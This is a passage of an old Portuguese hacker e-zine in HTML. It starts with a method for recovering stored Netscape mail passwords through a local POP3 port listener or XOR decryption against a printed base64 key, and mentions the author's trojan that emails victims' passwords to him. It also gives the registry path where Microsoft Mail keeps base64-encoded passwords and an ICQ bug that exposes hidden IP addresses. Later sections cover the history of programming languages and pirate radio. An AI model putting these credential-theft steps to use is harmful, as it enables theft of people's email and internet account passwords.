+<li>Starte seu port listener/dumper na porta 110 (POP3)  
+<li>V&aacute; em Netscape e clique em  "Get Mail"  
+<li>Retorne a seu port listener. Uma vez que voc&ecirc; esteja conectado, aparecer&aacute; um "+ok" ou coisa parecida (VC DEVE SABER QUANDO EST&Aacute; OU N&Atilde;O CONECTADO!!! SE VIRA), seguido da seguinte msg: "pass xxxxxxxx " (onde xxxxxxx ser&aacute; o password decriptado!)   
+</ul><p>
+
+<h2>M&eacute;todo Coderz</h2>  
+<h3>Material necess&aacute;rio:</h3>   
+<ul>
+	<li>seu de programa de linguagem favorito (eu proponho o qbasic ;)  
+	<li>Um decodificador MIME64   
+	<li>Um password!  
+</ul>
+
+<h3>Eis o que fazer:</h3>
+<ul>
+<li>Decodifique o password como uma string de MIME64;  
+<li>Quebre o password com a string encriptada MIME64 encontrada no fim desse documento.
+</ul>
+E voc&ecirc; ter&aacute; o pequeno password... <br>
+P.S.: A chave no t&eacute;rmino do documento deve ser "XOR 48" para ser v&aacute;lida. Eu tenho digitado o password como " 0000000000000... " eu estou muito pregui&ccedil;oso para remover esta m&aacute;scara..;) <br>
+Assim a rotina de decrypta&ccedil;&atilde;o faria algo como:   <p>
+for (c=0;pass[c] != '\0'; c++) pass[c] = pass[c] % netscapekey[c];   <br>
+ou   <br>
+for c := 1 to length(pass) do pass[c] := char(byte(pass[c]) XOR netscapekey[c]);  
+<p>
+
+<h2>O que fazer com aquela besteira toda?</h2>  
+Eu codifiquei um prot&oacute;tipo de "trojan portscanner" que me envia o password do usu&aacute;rio por E-mail quando ele roda o programa, e trabalha muito bem!  As possibilidades s&atilde;o quase infinitas! A maioria das Contas de E-mail s&atilde;o contas da Internet tamb&eacute;m, ent&atilde;o imagine o que um hacker com espirito de porco poderia fazer!  
+<p>
+
+<h2>Microsoft? Mais seguro?</h2>  
+Se voc&ecirc; &eacute; um usu&aacute;rio viciado da Microsoft, olhe isto: Para hackear o password do Microsoft Mail &eacute; quase  a mesma coisa que com o Netscape, exceto que  qualquer pessoa pode fazer isto com um decodificador MIME64! O Microsoft Mail guarda o password assim no registro:
+<p>
+HKEY_CURRENT_USER\Software\Microsoft\Internet Mail and News\Mail\POP3   
+<p>
+H&aacute; uma sub-chave criada neste caminho, com o nome da conta POP3. Por exemplo, se eu pusesse "localhost " como POP server, eu teria:
+<p>
+HKEY_CURRENT_USER\Software\...\Mail\POP3\localhost   
+<p>
+E neste caminho, n&oacute;s teremos uma entrada chamada password. Salve o valor desta password em um arquivo, ent&atilde;o decodifique isto com MIME64. Voc&ecirc; tem seu password!!!   
+<p>
+Os desenvolvedores da Microsoft s&atilde;o mais pregui&ccedil;osos que os da Netscape. Eles nem mesmo codificam decentemente os passwords no registro.
+<p>
+As Pessoas dizem: " A Internet est&aacute; segura ".
+<p>
+Eu digo: " Internet ser&aacute; insegura por... muito tempo "!
+<p>
+" Aproveitem o desenvolvimento profissional, amigos "!  <p>
+-the.avatar  <hr>
+<p>
+
+<h2><a name="mime">MIME64 ENCODED STRING:</a></h2>
+<pre>
+  Content-Type: text/plain; charset=US-ASCII; name=netscape.key
+  Content-transfer-encoding: base64 
+  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
+  7ukqjLZE8gmVuDcdtSMArckyQK39J4roGzUgDLQg/VM5+9xIdpZ0WElbUUgn
+  0CXAFdS5kaHgBOro5vrTpyM/Mzgn4DIPkQXARBbLVIzQJtO/P3VyXCQ7cvvA
+  ALZI9mGQR2uy/g0ruESUMxEpDb/IqoOgx1wgo8GRgENX6dEu23JKiQUn3MtZ
+  9y5LBTIgeKF54468wTeIz+wUWObx3IzBRmEdcD6+wb72GJOLsSHk+p6A8tCs
+  049eCiJwnDqnsOb92713P/DFnjGTibtyL8V2kaRapwmzfetlsoVM70j3Yilh
+  jJY7mD6h8nxzZqQWb+Dqe1fpbK6STXsDgvQTyj+TFGps3aR8e8MuORJvo8p2
+  AGK5orTzpKVgUx5ZkDdZ1dyJar7+YWfzCGfaezz3yWH7fDI1zJsqmHa7Ouv8
+  xeB8SpOy5i4cvIfkC6cH9IbGtQqT80vuRPj7+6CHeoQfVwqPcfzz3/57KcNn
+  658Xa7T/8BuLNGKiO7Gc2w6oyb/udErpbFu170oj2EKHef+oYt4WSRgvHKTw
+  g70Z37fRvhupREjJqe+1ZcZNeKRaaqSQ6opgcbKACtx2eHNeWm3MGuHHVUnW
+  i8cCt3XUymVoQIAhPfMswL5FHVs4+RvUB6alTGlER2NvvKm0JAR+kf2zeRsP
+  CG1Lv+8wy4eGFS6uNMZCZ7iPlhxs+3EDpIvJhRPv/D12UaBqsT4es4WvujBw
+  nsLxoBeLdWsd706kqms4yclkD5epm52qC/h1rsIe9FbxvB3m2hVpqHYXlZYs
+  gexoMPql7MYrQzKrPOBv3D4lbUOAFIkxHJ6GwyknKw6fujLQEukZC0B2unKS
+  +yF2Sl3QxbqLT+QjW4G/JfE/HdMPwPcfJuJMX43ZEHnEgoGXuadbZSvoV4ka
+  92ARtOpQd3sGLEL1VFHS6Zd2Qy99ASqiZyTAlN8yOPoINGhyMIxFcKKyAtiV
+  1Sa6YBEjw6l6P2I9WeXYbGt9GBtLHZznrbYKCtqjtnoF3G3WCTvBSJyg6Z5x
+  FLzOCWSgl9EjYS7Ge3j0q3mJFv7Nf2g14gClLACjkQvw6XHXDnD0IvV6el/V
+  p8IScZqNeL29DpVVostSpKbiopwYEmn0kpB5bvF+L2JhvNW49Ynuo/le0pND
+  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
+  QiiVO9ZGx3fC4w== 
+</pre>
+
+A Resposta da Microsoft &eacute; desconhecida at&eacute; este momento.
+
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+
+<h1><center>
+<a name="ICQBug">ICQ Bug</a>
+</center></h1>
+
+O ICQ 98 tem uma op&ccedil;&atilde;o para n&atilde;o mostrar seu pr&oacute;prio IP no seu info. Por&eacute;m, h&aacute; um bug q permite que voc&ecirc; possa ver os IP n&atilde;o autorizados:<p>
+<ol>
+<li>O user tem que estar na sua lista, e l&oacute;gicamente conectado.
+<li>Fique offline.
+<li>Agora, basta acessar o info da pessoa, porque  com certeza vai haver o endere&ccedil;o IP dela l&aacute;, como se a op&ccedil;&atilde;o de esconder IP n&atilde;o existisse... f&aacute;cil n&eacute;?
+</ol>
+Lufe (<A HREF="mailto:lufe@iname.com">lufe@iname.com</A>)
+
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+
+<h1><center>
+<a name="linguagens">Linguagens de Programa&ccedil;&atilde;o</a>
+</center></h1>
+<p>
+Quando surgiu o primeiro computador eletr&ocirc;nico program&aacute;vel, o ENIAC – Eletronic Numerical Integrator And Calculator -, n&atilde;o existia nenhum software que facilitasse a vida do programador. Para program&aacute;-lo, era necess&aacute;rio que este conhecesse o sistema bin&aacute;rio, as instru&ccedil;&otilde;es do processador (linguagem de m&aacute;quina) e a arquitetura do computador, al&eacute;m de ser obrigat&oacute;ria a entrada do programa por meio de chaves do tipo liga/desliga.
+<p>
+No in&iacute;cio, as tarefas hoje executadas pelos sistemas operacionais, tais como inicializa&ccedil;&atilde;o do computador e aloca&ccedil;&atilde;o de mem&oacute;ria tinham que tamb&eacute;m ser implementadas.
+<p>
+A linguagem de m&aacute;quina foi rapidamente substitu&iacute;da pela linguagem de montagem (assembly) que cont&eacute;m as mesmas instru&ccedil;&otilde;es da m&aacute;quina, mas representadas por c&oacute;digos simb&oacute;licos denominados mneum&ocirc;nicos. A vantagem disso &eacute; que os programas n&atilde;o eram mais codificados por sequ&ecirc;ncias de n&uacute;meros, mas sim por s&iacute;mbolos. 
+<p>
+Ao mesmo tempo em que a linguagem de montagem facilitou a cria&ccedil;&atilde;o e manuten&ccedil;&atilde;o de programas, ela fez com que os programas criados somente eram executados em m&aacute;quinas que possu&iacute;ssem o mesmo processador e sistema operacional.
+<p>
+Apesar da dificuldade, at&eacute; hoje as linguagens de montagem s&atilde;o utilizadas, principalmente para a cria&ccedil;&atilde;o de softwares b&aacute;sicos. Como linguagem de montagem temos a linguagem <B>Assembler</B>.<p>
+Vamos seguir a evolu&ccedil;&atilde;o das linguagens:
+
+<B><P>1956:
+<p>
+FORTRAN – </B>Abrevia&ccedil;&atilde;o de Formula Translator. &Eacute; a linguagem mais antiga, muito utilizada ainda hoje, na ci&ecirc;ncia, engenharia e desenvolvimento de software.
+
+<B><P>1960:
+</B>
+<B><P>COBOL - </B> (Common Business Oriented Language, ou seja, Linguagem Orientada a Neg&oacute;cios Comuns)<p>
+Foi idealizada para aplica&ccedil;&otilde;es comerciais, onde se manipulam grandes arquivos de dados. Possui a maior biblioteca de sub-programas ou rotinas auxiliares no desenvolvimento de sistemas no mundo inteiro. Estima-se que para converter toda essa base de programas para outra linguagem de auto n&iacute;vel, seria necess&aacute;rio em torno de 10% do PIB  americano. A&iacute; voc&ecirc; pergunta. e da&iacute; ? &Eacute; mesmo, quem seria o louco de fazer isso...<p>
+ Somente h&aacute; pouco tempo atr&aacute;s surgiu o Cobol para microcomputador. A MicroSoft &eacute; que realizou este feito.
+
+<B><P>ALGOL</B> – Abrevia&ccedil;&atilde;o de Algorithimic language. Uma nota&ccedil;&atilde;o alg&eacute;brica completa para solucionar problemas l&oacute;gicos por meio de algoritmos.
+
+<B><P>LISP</B> – Abrevia&ccedil;&atilde;o de List processor. trabalha com listas de dados num&eacute;ricos. Utilizada em simula&ccedil;&atilde;o, an&aacute;lise lingu&iacute;stica e intelig&ecirc;ncia artificial. A linguagem LISp, tamb&eacute;m &eacute; utilizada em rotinas de software gr&aacute;fico para gerenciamento de suas matrizes de projetos.
+
+<B><P>1964:
+</B>
+<B><P>PL/1 </B>– Abrevia&ccedil;&atilde;o de Programming Language 1. Derivada diretamente da Cobol e muito semelhante a esta na manipula&ccedil;&atilde;o de arquivos, utiliza recursos matem&aacute;ticos do FORTRAN.
+
+<B><P>Basic - </B>Beginners All-purpose Symbolic Instruction Code<B> - </B>O Basic foi desenvolvido no DartMouth College, em 1964, por John Kemeny e Thomas Kurtz, que reconheceram a necessidade de se criar uma linguagem de computa&ccedil;&atilde;o gen&eacute;rica, adequada a programadores iniciantes cujos conhecimentos profissionais fossem heterog&ecirc;neos. 
+
+<B><P>1967
+</B>
+<B><P>APL</B> – A Programming language. Favorita de matem&aacute;ticos e estat&iacute;sticos devido a seus poderosos operadores, que substituem dezenas de instru&ccedil;&otilde;es de outras linguagens.
+
+<B><P>1968
+</B>
+<B><P>ALGOL 68</B> – Vers&atilde;o gigante e poderosa da ALGOL definida por uma comiss&atilde;o europ&eacute;ia de cientistas.
+
+<B><P>1969:
+</B>
+<B><P>BCPL</B> – Abrevia&ccedil;&atilde;o de Basic Combined Programming Language. Linguagem que alia a estrutura da ALGOL ao poder de acesso &agrave; m&aacute;quina propiciado pela ASSEMBLER.
+
+<B><P>1970</B>:
+
+<B><P>PROLOG</B> – Abrevia&ccedil;&atilde;o de Programming Logic. Manipula afirma&ccedil;&otilde;es l&oacute;gicas. Utilizada nas pesquisas de intelig&ecirc;ncia artificial, foi escolhida no Jap&atilde;o, para o desenvolvimento da 5ª gera&ccedil;&atilde;o de computadores. Deriva diretamente da ALGOL.
+
+<B><P>1971</B>:
+
+<B><P>PASCAL</B> – Alguns atribuem o in&iacute;cio da linguagem em 1968. Nome decorrente da homenagem a Pascal, &eacute; uma linguagem simples que exige s&oacute;lida estrutura&ccedil;&atilde;o l&oacute;gica dos programas. Diversas vers&otilde;es derivaram da primeira:
+<p>
+Pascal concorrente – em 1975, vers&atilde;o ampliada para multiprograma&ccedil;&atilde;o.<p>
+Pascal UCSD – em 1977, vers&atilde;o ampliada para sistemas<p>
+Pascal ISO – De 1980 a 1982 – Vers&atilde;o padronizada, internacionalmente.
+<p>
+A estrutura da linguagem se parece um pouco com a linguagem C. A diferen&ccedil;a &eacute; que Pascal &eacute; uma linguagem mais de alto n&iacute;vel e menos flex&iacute;vel. Para exemplificar isso, vamos supor que queremos incrementar um n&uacute;mero i ; 
+<p>
+<b>Pascal: </b>
+<br>
+i:= i + 1 <br>
+INC(i)
+<p>
+<b>C++</b> 
+<br>
+i=i+1<br>
+<p>
+++i ( Pr&eacute;-incremento)
+<br>
+i++ (P&oacute;s incremento)
+<p>
+i+=1
+<p>
+Sacou a diferen&ccedil;a ? Isso se aplica tamb&eacute;m as facilidades que o C tem para o gerenciamento de mem&oacute;ria. Mas isso n&atilde;o quer dizer que o Pascal n&atilde;o &eacute; utilizado, para a maioria das aplica&ccedil;&otilde;es ele &eacute; uma solu&ccedil;&atilde;o eficiente, &agrave;s vezes, at&eacute; mais do que o C.
+<p>
+
+<B><P>1975</B>:
+
+<B><P>FORTH</B> – Deriva diretamente da FORTRAN, foi utilizada no desenvolvimento de softwares e aplicativos, para programas de r&aacute;pida execu&ccedil;&atilde;o e economia de mem&oacute;ria.
+
+<B><P>1978</B>:
+
+<B><P>A linguagem C - </B>&Eacute; uma linguagem de programa&ccedil;&atilde;o de finalidade geral que permite economia de express&atilde;o, modernos fluxos de controle e estruturas de dados e um rico conjunto de operadores. <p>
+Seu desenvolvimento se iniciou por volta de 1974.<p>
+C foi originalmente projetada para ser implementada no sistema operacional UNIX no PDP-11 da DEC, por Dennis Ritchie e Brian W. Kernighan. Na realidade C &eacute; o resultado do processo de desenvolvimento iniciado com outra linguagem , chamada BCPL, desenvolvida por Martin Richards. Esta linguagem influenciou a linguagem inventada por ken Thompson, chamada B, a qual levou o desenvolvimento da linguagem C.<p>
+Ela pode ser utilizada por exemplo para criar um sistema operacional (como j&aacute; foi utilizada no Unix, OS/2...), processadores de texto, banco de dados e sistemas aplicativos em geral.
+
+<B><P>1980:</B>
+<B><P>LOGO</B> – Projetada para crian&ccedil;as, desenvolve o racioc&iacute;nio l&oacute;gico, a habilidade de resolver problemas e o gosto pela matem&aacute;tica e computa&ccedil;&atilde;o. Derivada diretamente da linguagem LISP.
+
+<B><P>MODULA 2 </B>– Voltada para o desenvolvimento de sistemas, baseia-se em m&oacute;dulos independentes.
+
+<B><P>1982:</B>
+<B><P>ADA –</B> Estremamente poderosa, foi adotada pelo departamento de defesa dos EUA para todos os projetos e contratos governamentais.
+
+
+<B><P>1986:</B>
+<B><P>Clipper - </B>A primeira vers&atilde;o que eu ouvi falar foi a Clipper autumn. Depois surgiu o Clipper summer 87 e assim que come&ccedil;ou.Eu nunca vi uma linguagem t&atilde;o f&aacute;cil na minha vida. Gra&ccedil;as a essa linguagem que eu consegui o meu primeiro emprego. Ela &eacute; uma linguagem de alto n&iacute;vel pouco flexivel, a n&atilde;o ser que voc&ecirc; gere bibliotecas em C em conjunto com o Clipper. Essa linguagem causa s&eacute;rios problemas na sua execu&ccedil;&atilde;o devido aos execut&aacute;veis serem muito grandes. Muitas vezes n&atilde;o tem mem&oacute;ria convencional suficiente, da&iacute; j&aacute; sabe, abre autoexec.bat e config.sys, altera a vari&aacute;vel de ambiente (SET CLIPPER = E999),etc... <p>
+Como dizem por a&iacute;: a primeira linguagem agente nunca esquece.<p>
+Mas se voce nunca fez nenhum programa sequer, n&atilde;o custa nada tentar...Se voce nunca conseguiu programar, n&atilde;o se preocupe ! Com Clipper at&eacute; sua v&oacute; programa. ehehehe
+
+<B><P>Pr&aacute; Finalizar</B>
+<p>
+Bom existem muitas outras linguagens, umas mais mediocres outras menos: Dataflex(mais conhecido como Cacaflex) e muito outros...<p>
+Para terminar vou falar um pouco de Windows( bleeehhh). Com o surgimento do Windows, n&atilde;o sei se felizmente ou infelizmente mas n&atilde;o vamos entrar no m&eacute;rito da quest&atilde;o, houve uma revolu&ccedil;&atilde;o na maneira de se fazer programas. O que antes seguia uma l&oacute;gica sequencial(fa&ccedil;a isso depois aquilo), se transformou em uma l&oacute;gica mais distribu&iacute;da orientada a eventos. Isso significa, se o usu&aacute;rio mexer aqui, fa&ccedil;a isso ou se ele apertar aqui fa&ccedil;a aquilo outro e assim por diante. Mesmo porque o Windows trouxe o ambiente gr&aacute;fico junto com ele(mesmo j&aacute; existindo um ambiente gr&aacute;fico muito melhor h&aacute; muito tempo no System, o S.O. das m&aacute;quinas Macintosh), para os PC’s que s&oacute; conheciam o DOS era o m&aacute;ximo.
+<p>
+A partir da&iacute;, come&ccedil;aram a surgir deriva&ccedil;&otilde;es de diversas linguagens para Windows, como o Visual Basic, o Visual C++, o Delphi do Pascal, Visual Cobol, etc...Tamb&eacute;m surgiram outras menos conhecidas como Powerbuilder, SQL Windows...
+<p>
+Hoje a grande vantagem de se programar &eacute; que existe o conceito de programa&ccedil;&atilde;o orientada a objetos (POO). Simplificando, pode-se dizer que isso ajuda muito na reutiliza&ccedil;&atilde;o do que voc&ecirc; j&aacute; fez, na manuten&ccedil;&atilde;o dos programas, na rapidez de desenvolvimento e produtividade, no melhor relacionamento dos dados e estruturas do programa, e muitas outras coisas que se eu come&ccedil;ar a falar demais ning&uacute;em vai ler a mat&eacute;ria. ehehe..
+<p>
+[]’s 
+<p>
+Jabahanks
+
+<p><a href="#index">Volta ao in&iacute;cio</a>
+<p><hr><p>
+
+<h1><center>
+<a name="reforma">REFORMA AGRARIA NO AR</a>
+</center></h1>
+No in&iacute;cio do ano, estourou como bomba no jornal "Estado de S&atilde;o Paulo" que o site http://www.pt.org.br/radio/radiocom.htm tinha uma cartilha, preparada com o intuito de ajudar quem quer que quisesse instalar sua r&aacute;dio ou tv pirata ou comunit&aacute;ria. Todo mundo j&aacute; ouviu falar de r&aacute;dio pirata, tem ate' musica e o slogan: "radio pirata e' crime". Inclusive ate' sao feitas simulacoes de problemas ocasionados por radios desse genero, como interferencia em avioes, ambulancias, etc.. coisa que e' propaganda enganosa. Ninguem porem entende alguns pontos: sera' que instalar sua propria radio e' coisa de maluco que quer anarquizar e detonar com ambulancias ou avioes? Vamos colocar entao alguns pontos nos iis, comecando pela ideia que isso interfere nos avioes. Foi uma hipotese que surgiu, quando caiu o aviao da TAM e o dos Mamonas. Se for pesquisar os jornais da epoca, pode-se encontrar num deles (no Estado de Sao 